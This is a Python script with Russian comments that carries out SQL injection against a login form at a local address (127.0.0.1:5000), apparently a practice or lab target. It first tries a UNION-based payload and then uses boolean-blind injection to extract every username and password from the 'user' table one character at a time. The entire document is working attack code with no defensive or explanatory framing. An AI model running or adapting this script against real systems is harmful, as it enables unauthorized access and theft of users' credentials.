import requests
import time

target_url = "http://127.0.0.1:5000/login"

def get_all_users():
    print("\nПолучение данных всех пользователей:")
    
    # Сначала узнаем общее количество пользователей
    user_count = 0
    for i in range(1, 100):
        payload = f"' OR (SELECT COUNT(*) FROM user)={i} --"
        data = {'username': payload, 'password': 'doesntmatter'}
        response = requests.post(target_url, data=data)
        
        if "account" in response.url:
            user_count = i
            print(f"Всего пользователей в базе: {user_count}")
            break
    
    if user_count == 0:
        print("Не удалось определить количество пользователей")
        return
    
    # Получаем данные каждого пользователя
    for offset in range(0, user_count):
        print(f"\n[+] Пользователь #{offset+1}")
        
        # Извлекаем username
        username = ""
        for pos in range(1, 30):
            for char in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_-+= ":
                payload = f"' OR SUBSTR((SELECT username FROM user LIMIT 1 OFFSET {offset}),{pos},1)='{char}' --"
                data = {'username': payload, 'password': 'doesntmatter'}
                response = requests.post(target_url, data=data)
                
                if "account" in response.url:
                    username += char
                    print(f"Username: {username}", end='\r')
                    break
            else:
                break
        
        # Извлекаем password
        password = ""
        for pos in range(1, 30):
            for char in "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_-+= ":
                payload = f"' OR SUBSTR((SELECT password FROM user LIMIT 1 OFFSET {offset}),{pos},1)='{char}' --"
                data = {'username': payload, 'password': 'doesntmatter'}
                response = requests.post(target_url, data=data)
                
                if "account" in response.url:
                    password += char
                    print(f"Username: {username}, Password: {password}", end='\r')
                    break
            else:
                break
        
        print(f"\n[+] Найден пользователь: {username}:{password}")

def faster_extraction():
    print("\nБыстрое извлечение через UNION (если возможно):")
    
    # Пробуем получить все данные сразу через UNION
    payload = "' UNION SELECT id, username, password FROM user --"
    data = {'username': payload, 'password': 'doesntmatter'}
    response = requests.post(target_url, data=data)
    
    if "error" not in response.text.lower():
        print("Извлечение через UNION:")
        print(response.text[:1000])
    else:
        print("UNION-инъекция не сработала, используем слепой метод")

if __name__ == "__main__":
    print("=== Извлечение всех логинов и паролей пользователей ===")
    
    # Сначала пробуем быстрый метод через UNION
    faster_extraction()
    
    # Если не сработало, используем слепую инъекцию
    get_all_users()
